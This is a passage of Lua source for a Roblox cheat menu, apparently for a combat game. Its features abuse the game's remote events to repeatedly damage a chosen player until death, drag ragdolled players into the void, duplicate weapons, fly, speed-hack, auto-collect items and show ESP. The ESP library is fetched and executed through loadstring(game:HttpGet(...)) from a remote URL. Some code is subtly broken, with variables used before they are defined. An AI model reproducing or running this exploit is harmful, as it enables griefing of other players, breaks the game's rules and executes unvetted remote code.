        key = Enum.KeyCode.Question,
        callback = function()
            local Players = game:GetService("Players")
            local UserInputService = game:GetService("UserInputService")
            local LocalPlayer = Players.LocalPlayer
            
            local plrs = game:GetService'Players'
            local plr = plrs.LocalPlayer
            local mouse = plr:GetMouse()
            
            local hasDoubleJumped = false
            
            local function performDoubleJump()
                local character = LocalPlayer.Character
                local humanoid = character and character:FindFirstChildOfClass('Humanoid')
                        if humanoid and not hasDoubleJumped then
                            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            wait(0.1)
                            for _,v in next,plr.Backpack:GetChildren() do
                                if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
                                    v.Parent = plr.Character
                                    wait()
                                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                                    wait(0.1)
                                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                    v:Activate()
                                    v.Parent = plr.Backpack
                                end
                            end
                            hasDoubleJumped = true
                        end
                    end
            performDoubleJump()
        end
    })

    FGroup:addKeybind({
        flag = "FTJFlag",
        text = "Fake Triple Jump",
        key = Enum.KeyCode.Question,
        callback = function()
            local Players = game:GetService("Players")
            local UserInputService = game:GetService("UserInputService")
            local LocalPlayer = Players.LocalPlayer
            
            local plrs = game:GetService'Players'
            local plr = plrs.LocalPlayer
            local mouse = plr:GetMouse()
            
            local hasDoubleJumped = false
            
            local function performDoubleJump()
                local character = LocalPlayer.Character
                local humanoid = character and character:FindFirstChildOfClass('Humanoid')
                        if humanoid and not hasDoubleJumped then
                            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            wait(0.1)

                            for _,v in next,plr.Backpack:GetChildren() do
                                if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
                                    v.Parent = plr.Character
                                    wait()
                                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                                    wait(0.1)
                                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                    v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                                    v.Parent = plr.Backpack
                                end
                            end

                            wait(0.1)
                            for _,v in next,plr.Backpack:GetChildren() do
                                if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
                                    v.Parent = plr.Character
                                    wait()
                                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                                    wait(0.1)
                                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                    v:Activate()
                                    v.Parent = plr.Backpack
                                end
                            end
                            hasDoubleJumped = true
                        end
                    end
            performDoubleJump()
        end
    })

    FGroup:addKeybind({
        flag = "RFlag",
        text = "Reset",
        key = Enum.KeyCode.Question,
        callback = function()
            local player = game.Players.LocalPlayer
            local humanoid = game.Workspace[player.Name].Humanoid
            humanoid.Health = 0
        end
    })

    FGroup:addKeybind({
        flag = "GSFlag",
        text = "G2 Speed (Equip G2)",
        key = Enum.KeyCode.Question,
        callback = function()
            local Players = game:GetService("Players")
            local UserInputService = game:GetService("UserInputService")

            function GetCharacter()
                return workspace:FindFirstChild(Players.LocalPlayer.Name)
            end

            function TeleportBehindRightArm()
                local character = GetCharacter()
                if character then
                    local tool = character:FindFirstChild("Grenade 2")
                    local rightArm = character:FindFirstChild("Torso") or character:FindFirstChild("Torso")
                    
                    local backPosition = rightArm.Position - (character.HumanoidRootPart.CFrame.LookVector * 9)
                    
                    if tool then
                        tool:MoveTo(backPosition)
                    end
                end
            end
            TeleportBehindRightArm()
        end
    })

    local DASH_FORCE = 90
    local DASH_LIFT = 70

    FGroup:addKeybind({
        flag = "FDFlag",
        text = "Fake Dash",
        key = Enum.KeyCode.Question,
        callback = function()
            local player = game:GetService("Players").LocalPlayer
            local userInput = game:GetService("UserInputService")
            local runService = game:GetService("RunService")
            
            local function performDash()
                local character = player.Character
                if not character then return end
            
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local humanoid = character:FindFirstChild("Humanoid")
                if not humanoidRootPart or not humanoid then return end
            
                local moveDirection = humanoid.MoveDirection
                if moveDirection.Magnitude == 0 then return end
            
                local dashVelocity = (moveDirection * DASH_FORCE) + Vector3.new(0, DASH_LIFT, 0)
                humanoidRootPart.Velocity = dashVelocity
            end

            if getgenv().AutoBackSpace then
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                performDash()
            elseif not getgenv().AutoBackSpace then
                performDash()
            end
        end
    })

    FGroup:addToggle({
        text = "Auto Backspace",
        flag = "ABToggle",
        callback = function(v)
            getgenv().AutoBackSpace = v
        end
    })

    FGroup:addSlider({
        flag = "FDHeightForce",
        text = "Dash Force",
        min = 1,
        max = 600,
        value = DASH_FORCE,
        callback = function(x)
            DASH_FORCE = x
        end
    })

    FGroup:addSlider({
        flag = "FDHeight",
        text = "Dash Height",
        min = 1,
        max = 200,
        value = DASH_LIFT,
        callback = function(x)
            DASH_LIFT = x
        end
    })

    local LGroup = MiscTab:createGroup('right', 'Target')

    local usernamee = ""
    local QPlayers = game:GetService("Players")
    local QLocalPlayer = QPlayers.LocalPlayer
    local QCharacter = QLocalPlayer.Character or QLocalPlayer.CharacterAdded:Wait()
    local QIsCooldown = false
    local QTargetUsername = ""
    local QTargetPlayer = nil
    local QLoopActive = false
    local QConnection 

    local function QFindPlayer(QUsername)
        for _, QPlayer in pairs(QPlayers:GetPlayers()) do
            if QPlayer.Name:lower() == QUsername:lower() then
                return QPlayer
            end
        end
        return nil
    end

    local function QStartCooking()
        while QLoopActive do
            wait(1)
            QTargetPlayer = QFindPlayer(QTargetUsername)

            if not QTargetPlayer or not QTargetPlayer.Character or not QTargetPlayer.Character:FindFirstChild("Humanoid") then
                library:notify("Player left. Stopping loop.")
                QLoopActive = false

                QConnection = QPlayers.PlayerAdded:Connect(function(QPlayer)
                    if QPlayer.Name == QTargetUsername then
                        library:notify("Player rejoined. Restarting loop.")
                        QLoopActive = true
                        QStartCooking()
                    end
                end)
                return
            end

            local QTarget = QTargetPlayer.Character.Humanoid
            local QTool = QLocalPlayer.Backpack:FindFirstChild("Kawaii Revolver")
            local QDamageRemote = QTool and QTool:FindFirstChild("DamageRemote")

            if QTool and QDamageRemote then
                local QShield = QTargetPlayer.Character:FindFirstChild("Shield")
                if QShield then
                    library:notify("Player has shield")
                end

                while QTarget and QTarget.Health > 0 and QLoopActive do
                    if not QIsCooldown then
                        QIsCooldown = true
                        QTool.Parent = QCharacter
                        QDamageRemote:FireServer(QTarget)
                        QTool.Parent = QLocalPlayer.Backpack
                        wait(0.8)
                        QIsCooldown = false
                    end
                    wait()
                end

                if QTarget and QTarget.Health <= 0 then
                    library:notify("You killed the player.")
                end
            else
                library:notify("Weapon not found. Stopping loop.")
                QLoopActive = false
            end
        end
    end

    local function QUpdatePlayerList()
        local QPlayersList = {}
        for _, QPlayer in pairs(QPlayers:GetPlayers()) do
            if QPlayer ~= QLocalPlayer then
                table.insert(QPlayersList, QPlayer.Name)
            end
        end
        return QPlayersList
    end

    LGroup:addList({
        flag = "playerDropdown",
        text = "Revolver Loop",
        values = QUpdatePlayerList(),
        callback = function(QSelectedPlayer)
            QTargetUsername = QSelectedPlayer or ""
        end
    })

    LGroup:addToggle({
        text = "Start / Stop",
        flag = "LStart",
        callback = function(QValue)
            QLoopActive = QValue
            if QLoopActive and QTargetUsername ~= "" then
                QStartCooking()
            elseif not QLoopActive then
                library:notify("loop stopped.")
            else
                library:notify("Select a player first.")
            end
        end
    })

    QLocalPlayer.CharacterAdded:Connect(function(QNewCharacter)
        QCharacter = QNewCharacter
        wait(1)
        if QLoopActive then
            QStartCooking()
        end
    end)

    LGroup:addButton({
        text = "Void Target",
        callback = function()
            local userrname3 = usernamee
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            
            local function g(username)
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name:lower() == username:lower() then
                        return player
                    end
                end
                return nil
            end
            
            local targetPlayer = g(userrname3)
            
            if targetPlayer and targetPlayer.Character then
                local targetModel = workspace:FindFirstChild(targetPlayer.Name) 
                if targetModel then
                    local targetHumanoid = targetModel:FindFirstChild("Humanoid")
                    local targetRagdolled = targetModel:FindFirstChild("Ragdolled") 
                    
                    if targetRagdolled then
                        local tool = LocalPlayer.Backpack:FindFirstChild("Kawaii Revolver")
                        local damageRemote = tool and tool:FindFirstChild("DamageRemote")
                        
                        spawn(function()
                            local tiempoDeLoop = 2
                            local inicio = tick()
                            local radio = 0

                            while tick() - inicio < tiempoDeLoop do
                                local angulo = (tick() - inicio) * math.pi  
                                local nuevaPosicion = objetivo.HumanoidRootPart.Position + Vector3.new(
                                    math.cos(angulo) * radio, 
                                    0,                         
                                    math.sin(angulo) * radio  
                                )

                                jugador.Character.HumanoidRootPart.CFrame = CFrame.new(nuevaPosicion)
                            end
                        end)

                        if damageRemote then
                            while targetRagdolled.Value == false do
                                damageRemote:FireServer(targetHumanoid)
                                wait(0.5)
                            end
                        else
                            warn("No se encontró el 'DamageRemote' en el arma.")
                        end
                        
                        if targetRagdolled.Value == true then
                            local function teletransportarseAObjetivo(jugador, objetivoNombre)
                                local objetivo = workspace:FindFirstChild(objetivoNombre)

                                if objetivo then
                                    local ragdollValue = objetivo:FindFirstChild("Ragdolled")
                                    if ragdollValue and ragdollValue.Value == true then
                                        if jugador.Character and jugador.Character:FindFirstChild("HumanoidRootPart") and objetivo:FindFirstChild("HumanoidRootPart") then
                                            jugador.Character.HumanoidRootPart.CFrame = objetivo.HumanoidRootPart.CFrame

                                            local player = game.Players.LocalPlayer
                                            if player and player.Character then
                                                local remote = player.Character:FindFirstChild("PickupRemote")
                                                local targetPlayer2 = g(userrname3)
                                                if targetPlayer2 and targetPlayer2.Character then
                                                    local targetModel2 = workspace:FindFirstChild(targetPlayer2.Name)
                                                    local beingCarried = targetModel2:FindFirstChild("Being Carried")
                                                    while beingCarried and not beingCarried.Value do
                                                        remote:FireServer(targetPlayer2.Character)
                                                        wait(0.03)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            local jugador = game.Players.LocalPlayer
                            local objetivoNombre = userrname3
                            teletransportarseAObjetivo(jugador, objetivoNombre)

                            local character = game.Players.LocalPlayer.Character
                            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
                            if rootPart then
                                rootPart.CFrame = CFrame.new(10394, -113, -10404)
                                wait(0.1)
                                rootPart.CFrame = CFrame.new(10396.37, -426.99, -10406.17)
                                
                                local humanoid = character:FindFirstChild("Humanoid")
                                if humanoid then
                                    humanoid.Sit = true
                                    task.wait(0.1)
                                    if rootPart then
                                        rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
                                    end

                                    for _, animation in ipairs(humanoid:GetPlayingAnimationTracks()) do
                                        animation:Stop()
                                    end
                                end

                                local player = game.Players.LocalPlayer
                                local humanoid = game.Workspace[player.Name]:FindFirstChild("Humanoid")
                                if humanoid then
                                    humanoid.Health = 0
                                end
                            else
                                warn("HumanoidRootPart no encontrado.")
                            end
                        end
                    else
                        warn("No se encontró el BoolValue 'Ragdolled' en el modelo del jugador objetivo.")
                    end
                else
                    warn("No se encontró el modelo del jugador objetivo en el Workspace.")
                end
            else
                library:notify("User not founded.")
            end
        end
    })

    LGroup:addButton({
        text = "Goto SafeZone",
        callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000, 100009, 100000)
        end
    })

    local ASGroup = MiscTab:createGroup('right', 'Auto Select')

    local Pressing = false
    
    ASGroup:addToggle({
        text = "Enable",
        flag = "ASToggle",
        callback = function()
            local stopFlag = false
            local function pressKey()
                wait(.5)  
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadSeven, false, game)
            end
        
            if Pressing then
                Pressing = false
                stopFlag = true
            else
                Pressing = true
                stopFlag = false
                spawn(function()
                    repeat
                        pressKey()
                        wait(1)
                        game:GetService("RunService").Heartbeat:Wait()
                    until stopFlag or not Pressing
                end)
            end
        end
    })
    
    ASGroup:addList({
        flag = "ASDropdown",
        text = "Choose a Weapon",
        values = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear","Pink Hammer","Steel Sword","Katana","Holloween Dagger"},
        value = "Emerald Greatsword",
        multiselect = false,
        callback = function(weapon)
            local Mouse = game.Players.LocalPlayer:GetMouse()
            game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
            if IsTyping then return end
            if Input.KeyCode == Enum.KeyCode.KeypadSeven then
                local Player = game:GetService("Players").LocalPlayer
                local Mouse = Player:GetMouse()
                game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
                Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer(weapon)
                wait(1) end
            end)
        end
    })

    local KGroup = MiscTab:createGroup('right', 'Movement')

    KGroup:addKeybind({
        flag = "FBind",
        text = "Fly",
        key = Enum.KeyCode.Question,
        callback = function()
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadEight, false, game)
        end
    })

    local flySpeed = 100
    local maxFlySpeed = 1000

    KGroup:addSlider({
        flag = "FSSlider",
        text = "Fly Speed",
        min = 1,
        max = maxFlySpeed,
        value = flySpeed,
        callback = function(x)
            flySpeed = x
        end
    })

    function LoadFly()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local camera = game.Workspace.CurrentCamera
        local userInputService = game:GetService("UserInputService")
        local runService = game:GetService("RunService")
        local ValueControl = false
        local moveDirection = Vector3.new(0, 0, 0)
        local sliderHeld = false
        local flyVelocity, flyControl
        local isConfirmDelete = false
        
        local function updateFlySpeed(x)
            local relativePos = math.clamp((x - sliderAbsPos) / sliderWidth, 0, 1)
            flySpeed = math.floor(relativePos * maxFlySpeed)
        end

        local function startFly()
            humanoid.PlatformStand = true
            flyVelocity = Instance.new("BodyVelocity")
            flyVelocity.Velocity = Vector3.new(0, 0, 0)
            flyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
            flyVelocity.Parent = rootPart
            flyControl = Instance.new("BodyGyro")
            flyControl.CFrame = rootPart.CFrame
            flyControl.MaxTorque = Vector3.new(100000, 100000, 100000)
            flyControl.P = 10000
            flyControl.Parent = rootPart
        end
        
        local function stopFly()
            if flyVelocity then flyVelocity:Destroy() end
            if flyControl then flyControl:Destroy() end
            humanoid.PlatformStand = false
        end
        
        local function updateFly()
                moveDirection = Vector3.new(0, 0, 0)
                if userInputService:IsKeyDown(Enum.KeyCode.W) then
                    moveDirection = moveDirection + camera.CFrame.LookVector
                end
                if userInputService:IsKeyDown(Enum.KeyCode.S) then
                    moveDirection = moveDirection - camera.CFrame.LookVector
                end
                if userInputService:IsKeyDown(Enum.KeyCode.A) then
                    moveDirection = moveDirection - camera.CFrame.RightVector
                end
                if userInputService:IsKeyDown(Enum.KeyCode.D) then
                    moveDirection = moveDirection + camera.CFrame.RightVector
                end
                if userInputService:IsKeyDown(Enum.KeyCode.Space) then
                    moveDirection = moveDirection + Vector3.new(0, 1, 0)
                end
        
                if moveDirection.Magnitude > 0 then
                    flyVelocity.Velocity = moveDirection.Unit * flySpeed
                else
                    flyVelocity.Velocity = Vector3.new(0, 0, 0)
                end
        
            flyControl.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camera.CFrame.LookVector)
        end
        
        runService.RenderStepped:Connect(function()
            if ValueControl then
                updateFly()
            end
        end)
        
        userInputService.InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.KeypadEight then
                if not isConfirmDelete then
                    ValueControl = not ValueControl
                    if ValueControl then
                        startFly()
                    else
                        stopFly()
                    end
                end
            end
        end)

        player.CharacterAdded:Connect(function(char)
            character = char
            humanoid = character:WaitForChild("Humanoid")
            rootPart = character:WaitForChild("HumanoidRootPart")
            ValueControl = false
            if ValueControl then
                startFly()
            end
        end)
    end

    LoadFly()

    local RunService = game:GetService("RunService")
    local player = Players.LocalPlayer
    local cframeSpeed = 100

    getgenv().cframeEnabled = false

    local connection

    local function cframe()
        if connection then connection:Disconnect() end

        connection = RunService.RenderStepped:Connect(function(deltaTime)
            local character = player.Character
            if not character or not character.PrimaryPart then return end

            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if getgenv().cframeEnabled and humanoid and humanoid.MoveDirection.Magnitude > 0 then
                local moveDirection = humanoid.MoveDirection * cframeSpeed * deltaTime
                character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame + moveDirection)
            end
        end)
    end

    local function onCharacterAdded(character)
        character:WaitForChild("Humanoid")
        character:WaitForChild("HumanoidRootPart")
        cframe()
    end

    player.CharacterAdded:Connect(onCharacterAdded)

    if player.Character then
        onCharacterAdded(player.Character)
    end

    KGroup:addDivider()

    KGroup:addKeybind({
        flag = "CToggle",
        text = "CFrame",
        key = Enum.KeyCode.Question,
        callback = function()
            getgenv().cframeEnabled = not getgenv().cframeEnabled
        end
    })

    KGroup:addSlider({
        flag = "CSlider",
        text = "CFrame Speed",
        min = 1,
        max = 500,
        value = 20,
        callback = function(x)
            cframeSpeed = x
        end
    })

    KGroup:addDivider()

    local hplayer = game.Players.LocalPlayer
    local runService = game:GetService("RunService")

    local humanoid = nil
    local rootPart = nil
    local bhopActive = false
    local velocity = 20 
    local acceleration = 2 
    local maxSpeed = 100
    local bhopConnection

    local function bhop()
        if not bhopActive or not humanoid or not rootPart then return end

        if humanoid.FloorMaterial ~= Enum.Material.Air then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            velocity = math.min(velocity + acceleration, maxSpeed)
        end

        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            rootPart.Velocity = Vector3.new(moveDirection.X * velocity, rootPart.Velocity.Y, moveDirection.Z * velocity)
        end
    end

    local function setupCharacter(character)
        humanoid = character:WaitForChild("Humanoid", 5)
        rootPart = character:WaitForChild("HumanoidRootPart", 5)

        if not humanoid or not rootPart then
            warn("No se pudo encontrar Humanoid o HumanoidRootPart")
            return
        end

        if bhopActive and not bhopConnection then
            bhopConnection = runService.Heartbeat:Connect(bhop)
        end

        humanoid.Died:Connect(function()
            if bhopConnection then
                bhopConnection:Disconnect()
                bhopConnection = nil
            end
        end)
    end

    hplayer.CharacterAdded:Connect(setupCharacter)

    if hplayer.Character then
        setupCharacter(hplayer.Character)
    end

    KGroup:addKeybind({
        flag = "BHToggle",
        text = "BHop",
        key = Enum.KeyCode.Question,
        callback = function()
            bhopActive = not bhopActive
            if bhopActive then
                velocity = velocity
                if not bhopConnection then
                    bhopConnection = runService.Heartbeat:Connect(bhop)
                end
            else
                if bhopConnection then
                    bhopConnection:Disconnect()
                    bhopConnection = nil
                end
            end
        end
    })

    KGroup:addSlider({
        flag = "BHSVelocity",
        text = "Start Velocity",
        min = 1,
        max = 100,
        value = 20,
        callback = function(x)
            velocity = x
        end
    })

    KGroup:addSlider({
        flag = "BHVAcceleration",
        text = "Velocity Acceleration",
        min = 1,
        max = 10,
        value = 2,
        callback = function(x)
            acceleration = x
        end
    })

    KGroup:addSlider({
        flag = "BHMVelocity",
        text = "Max Velocity",
        min = 0,
        max = 1000,
        value = 100,
        callback = function(x)
            maxSpeed = x
        end
    })

    local DGroup = MiscTab:createGroup('left', 'Dupe')

    local Farming = false

    DGroup:addToggle({
        text = "Dupe Axe",
        flag = "DupeAxe",
        callback = function()
            if Farming then
                Farming = false
            else
                Farming = true
                repeat
        local player = game.Players.LocalPlayer
        
        repeat
            wait()
        until player.Character
        
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.5)
        until player.Character
        
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local menuScreen = playerGui:FindFirstChild("Menu Screen")
            if menuScreen and menuScreen:IsA("ScreenGui") then
                menuScreen.Enabled = false
                if menuScreen:FindFirstChild("RemoteEvent") then
                    menuScreen.RemoteEvent:FireServer("Emerald Greatsword")
                else

                end
            else

            end
        else

        end
        
        local function performActionAfterSpawn()
            wait()
            if player.Character then
                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
                wait(0.3)
        
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                    wait()
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.2)
        until player.Character
        
        local Axe = player.Backpack:FindFirstChild("Throwing Knife")
        
        if Axe then
            local humanoid = player.Character:FindFirstChild("Humanoid")
        
            if humanoid then
                humanoid:EquipTool(Axe)
            else

            end
        else

                   end
                    wait(0.3)
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                end
            else

            end
        end
        
        if player.Character then
            performActionAfterSpawn()
        else
            player.CharacterAdded:Connect(performActionAfterSpawn)
        end
         game:GetService("RunService").Heartbeat:Wait()
                until stopFlag or not Farming
            end
        end
    })

    DGroup:addToggle({
        text = "Dupe Grenade 2",
        flag = "DupeGrenade2",
        callback = function()
            if Farming then
                Farming = false
            else
                Farming = true
                repeat
        local player = game.Players.LocalPlayer
        
        repeat
            wait()
        until player.Character
        
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.5)
        until player.Character
        
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local menuScreen = playerGui:FindFirstChild("Menu Screen")
            if menuScreen and menuScreen:IsA("ScreenGui") then
                menuScreen.Enabled = false
                if menuScreen:FindFirstChild("RemoteEvent") then
                    menuScreen.RemoteEvent:FireServer("Emerald Greatsword")
                else

                end
            else

            end
        else

        end
        
        local function performActionAfterSpawn()
            wait()
            if player.Character then
                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
                wait(0.3)
        
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                    wait()
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.2)
        until player.Character
        
        local grenade2 = player.Backpack:FindFirstChild("Grenade 2")
        
        if grenade2 then
            local humanoid = player.Character:FindFirstChild("Humanoid")
        
            if humanoid then
                humanoid:EquipTool(grenade2)
            else

            end
        else

                   end
                    wait(0.3)
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                end
            else

            end
        end
        
        if player.Character then
            performActionAfterSpawn()
        else
            player.CharacterAdded:Connect(performActionAfterSpawn)
        end
         game:GetService("RunService").Heartbeat:Wait()
                until stopFlag or not Farming
            end
        end
    })

    DGroup:addToggle({
        text = "Dupe Dagger",
        flag = "DupeDagger",
        callback = function()
            if Farming then
                Farming = false
            else
                Farming = true
                repeat
        local player = game.Players.LocalPlayer
        
        repeat
            wait()
        until player.Character
        
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.5)
        until player.Character
        
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local menuScreen = playerGui:FindFirstChild("Menu Screen")
            if menuScreen and menuScreen:IsA("ScreenGui") then
                menuScreen.Enabled = false
                if menuScreen:FindFirstChild("RemoteEvent") then
                    menuScreen.RemoteEvent:FireServer("Holloween Dagger")
                else

                end
            else
                
            end
        else

        end
        
        local function performActionAfterSpawn()
            wait()
            if player.Character then
                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
                wait(0.3)
        
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                    wait()
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.2)
        until player.Character
        
        local Dagger = player.Backpack:FindFirstChild("Holloween Dagger")
        
        if Dagger then
            local humanoid = player.Character:FindFirstChild("Humanoid")
        
            if humanoid then
                humanoid:EquipTool(Dagger)
            else

            end
        else

            end
                wait(0.3)
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                end
            else

            end
        end
        
        if player.Character then
            performActionAfterSpawn()
        else
            player.CharacterAdded:Connect(performActionAfterSpawn)
        end
         game:GetService("RunService").Heartbeat:Wait()
                until stopFlag or not Farming
            end
        end
    })

    DGroup:addToggle({
        text = "Dupe Steel",
        flag = "DupeSteel",
        callback = function()
            if Farming then
                Farming = false
            else
                Farming = true
                repeat
        local player = game.Players.LocalPlayer
        
        repeat
            wait()
        until player.Character
        
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.5)
        until player.Character
        
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local menuScreen = playerGui:FindFirstChild("Menu Screen")
            if menuScreen and menuScreen:IsA("ScreenGui") then
                menuScreen.Enabled = false
                if menuScreen:FindFirstChild("RemoteEvent") then
                    menuScreen.RemoteEvent:FireServer("Steel Sword")
                else

                end
            else
                
            end
        else

        end
        
        local function performActionAfterSpawn()
            wait()
            if player.Character then
                player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
                wait(0.3)
        
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                    wait()
        local player = game.Players.LocalPlayer
        
        repeat
            wait(.2)
        until player.Character
        
        local Steel = player.Backpack:FindFirstChild("Steel Sword")
        
        if Steel then
            local humanoid = player.Character:FindFirstChild("Humanoid")
        
            if humanoid then
                humanoid:EquipTool(Steel)
            else

            end
        else

            end
                wait(0.3)
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                end
            else

            end
        end
        
        if player.Character then
            performActionAfterSpawn()
        else
            player.CharacterAdded:Connect(performActionAfterSpawn)
        end
         game:GetService("RunService").Heartbeat:Wait()
                until stopFlag or not Farming
            end
        end
    })

    DGroup:addButton({
        text = "Collect All",
        callback = function()
            local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
            wait(0.1)
            local function touch(x)
                x = x:FindFirstAncestorWhichIsA("BasePart")
                if x and firetouchinterest then
                    if x.Name == "Button" then
                        return
                    end
                    
                    task.spawn(function()
                        firetouchinterest(x, root, 1)
                        wait()
                        firetouchinterest(x, root, 0)
                    end)
                    x.CFrame = root.CFrame
                end
            end
    
            for _, descendant in ipairs(workspace:GetDescendants()) do
                if descendant:IsA("TouchTransmitter") then
                    touch(descendant)
                end
            end


            if game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Frame.Visible == true then
                game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Frame.Visible = false
            end
            
            if game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").ViewportFrame.Visible == true then
                game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").ViewportFrame.Visible = false
            end
        end
    })

    DGroup:addButton({
        text = "Throw All Grenades",
        callback = function()
            for _,v in next,plr.Backpack:GetChildren() do
                if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
                    v.Parent = plr.Character
                    v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                    v.Parent = plr.Backpack
                end
            end
        end
    })

    DGroup:addButton({
        text = "Throw All Axes",
        callback = function()
            for _,v in next,plr.Backpack:GetChildren() do
                if v.Name == 'Throwing Knife' and v:FindFirstChild'RemoteEvent' then
                    v.Parent = plr.Character
                    v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                    v.Parent = plr.Backpack
                end
            end
        end
    })

    local VisualTab = library:addTab("Visuales")

    local ESPGroup = VisualTab:createGroup('left', 'Esp')

    local Sense = loadstring(game:HttpGet('https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/realcap.lua'))()

    Sense.teamSettings.enemy.enabled = true
    Sense.teamSettings.enemy.box = true
    Sense.teamSettings.enemy.boxColor[1] = Color3.fromRGB(240, 142, 214)
    Sense.teamSettings.enemy.boxOutline = false

    Sense.teamSettings.enemy.boxFill = false
    Sense.teamSettings.enemy.boxFillColor[1] = Color3.fromRGB(50, 22, 53)

    Sense.teamSettings.enemy.healthBar = false
    Sense.teamSettings.enemy.healthyColor = Color3.fromRGB(180, 76, 232)
    Sense.teamSettings.enemy.healthBarOutline = true

    Sense.teamSettings.enemy.healthText = false
    Sense.teamSettings.enemy.healthTextColor[1] = Color3.fromRGB(255,255,255)
    Sense.teamSettings.enemy.healthTextOutline = true

    Sense.teamSettings.enemy.name = false
    Sense.teamSettings.enemy.nameColor[1] = Color3.fromRGB(255,255,255)

    Sense.teamSettings.enemy.weapon = false
    Sense.teamSettings.enemy.weaponColor[1] = Color3.fromRGB(255,255,255)

    Sense.teamSettings.enemy.distance = false
    Sense.teamSettings.enemy.distanceColor[1] = Color3.fromRGB(255,255,255)

    Sense.teamSettings.enemy.tracer = false
    Sense.teamSettings.enemy.tracerOrigin = ""
    Sense.teamSettings.enemy.tracerColor[1] = Color3.fromRGB(178, 45, 191)

    Sense.teamSettings.enemy.offScreenArrow = false
    Sense.teamSettings.enemy.offScreenArrowColor[1] = Color3.fromRGB(255,255,255)
    Sense.teamSettings.enemy.offScreenArrowSize = 15
    Sense.teamSettings.enemy.offScreenArrowRadius = 150


    local c1 = ESPGroup:addToggle({
        text = "Enable",
        flag = "boxtoggle",
        callback = function(x)
            if x then
                Sense.Load()    
            else
                Sense.Unload()    
            end
        end
    })

    c1:addColorpicker({
        text = "Choose a Color",
        flag = "boxcolor",
        color = Color3.fromRGB(240, 142, 214),
        callback = function(color)
            Sense.teamSettings.enemy.boxColor[1] = color
        end
    })

    local c2 = ESPGroup:addToggle({
        text = "Box Fill",
        flag = "boxfilltoggle",
        callback = function(x)
